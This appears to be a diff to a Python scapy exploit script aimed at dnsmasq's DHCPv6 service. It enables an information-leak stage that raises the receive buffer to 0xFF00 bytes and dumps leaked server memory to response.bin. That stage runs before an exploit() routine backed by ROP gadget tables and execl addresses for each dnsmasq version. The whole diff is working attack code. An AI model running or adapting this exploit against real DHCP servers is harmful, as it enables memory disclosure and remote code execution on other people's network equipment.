@@ -5,6 +5,7 @@ from argparse import ArgumentParser
 from sys import exit
 from scapy.all import sendp, sniff, Ether, IPv6, UDP, DHCP6_Solicit, DHCP6OptRapidCommit, DHCP6OptOptReq
 from scapy.all import DHCP6OptElapsedTime, DHCP6OptClientId, DHCP6OptIA_NA, DHCP6_Reply, DHCP6OptServerId
+from socket import socket, AF_INET6, SOCK_DGRAM, SOL_SOCKET, SO_RCVBUF
 from random import randint
 from netaddr import EUI
 from tm import ThreadManager
@@ -132,7 +133,7 @@ ROP = {
     }
 }
 
-N_BYTES = 0x0800
+N_BYTES = 0xFF00
 
 Base = Base()
 Base.print_banner()
@@ -278,6 +279,30 @@ else:
         exit(1)
 
 
+def get_dhcpv6_server_duid():
+    if dhcpv6_server_duid is None:
+        print Base.c_info + "Wait for receive DHCPv6 server duid..."
+        tm.add_task(recv_dhcpv6_reply)
+        sleep(3)
+        send_dhcpv6_solicit()
+        sleep(5)
+
+        while True:
+            if dhcpv6_server_duid is None:
+                send_dhcpv6_solicit()
+                sleep(5)
+            else:
+                break
+
+        print Base.c_success + "DHCPv6 server mac address: " + str(dhcpv6_server_mac)
+        print Base.c_success + "DHCPv6 server IPv6 link address: " + str(dhcpv6_server_ipv6_link)
+        print Base.c_success + "DHCPv6 server duid: " + str(dhcpv6_server_duid).encode("hex")
+        sleep(5)
+        return True
+    else:
+        return True
+
+
 def send_dhcpv6_solicit():
     sol = DHCP6_Solicit()
     rc = DHCP6OptRapidCommit()
@@ -316,7 +341,7 @@ def send_dhcpv6_solicit():
 
 
 def recv_dhcpv6_reply():
-    sniff(iface=current_network_interface, stop_filter=dhcpv6_callback,
+    sniff(iface=current_network_interface, stop_filter=dhcpv6_callback, count=1,
           filter="udp and src port 547 and dst port 546 and ip6 dst host " + ipv6src_link)
 
 
@@ -407,22 +432,10 @@ def inner_pkg(duid):
 
 
 def info_leak():
-    print Base.c_info + "Wait for receive DHCPv6 server duid..."
-    tm.add_task(recv_dhcpv6_reply)
-    sleep(3)
-    send_dhcpv6_solicit()
-    sleep(5)
-
-    while True:
-        if dhcpv6_server_duid is None:
-            send_dhcpv6_solicit()
-            sleep(5)
-        else:
-            break
-
-    print Base.c_success + "DHCPv6 server mac address: " + str(dhcpv6_server_mac)
-    print Base.c_success + "DHCPv6 server IPv6 link address: " + str(dhcpv6_server_ipv6_link)
-    print Base.c_success + "DHCPv6 server duid: " + str(dhcpv6_server_duid).encode("hex")
+    # Receive info leak reply
+    sock = socket(AF_INET6, SOCK_DGRAM)
+    sock.setsockopt(SOL_SOCKET, SO_RCVBUF, N_BYTES)
+    sock.bind(('::', 547))
 
     duid = unhexlify(str(dhcpv6_server_duid).encode("hex"))
     assert len(duid) == 14
@@ -445,7 +458,7 @@ def info_leak():
     ipv6.src = ipv6src
     ipv6.dst = host
 
-    udp.sport = 547
+    udp.sport = 546
     udp.dport = 547
 
     pkt = eth / ipv6 / udp / pkg
@@ -457,18 +470,10 @@ def info_leak():
         print Base.c_error + "Do not send info leak request."
         exit(1)
 
-    # # Setup receiving port
-    # sock = socket(AF_INET6, SOCK_DGRAM)
-    # sock.setsockopt(SOL_SOCKET, SO_RCVBUF, N_BYTES)
-    # sock.bind(('::', 547))
-    #
-    # Send request
-
-    # send_packet(pkg, host, 547)
-    #
-    # # Dump response
-    # with open('response.bin', 'wb') as f:
-    #     f.write(sock.recvfrom(N_BYTES)[0])
+    with open('response.bin', 'wb') as response_file:
+        response_file.write(sock.recvfrom(N_BYTES)[0])
+    print Base.c_success + "Dump info leak response to file: response.bin"
+    sock.close()
 
 
 def exploit():
@@ -555,5 +560,7 @@ if __name__ == '__main__':
     print Base.c_info + "Address segment .data: " + str(DATA[architecture][dnsmasq_version])
     print Base.c_info + "Address execl function: " + str(EXECL[architecture][dnsmasq_version])
 
-    # info_leak()
+    if get_dhcpv6_server_duid():
+        info_leak()
+
     exploit()
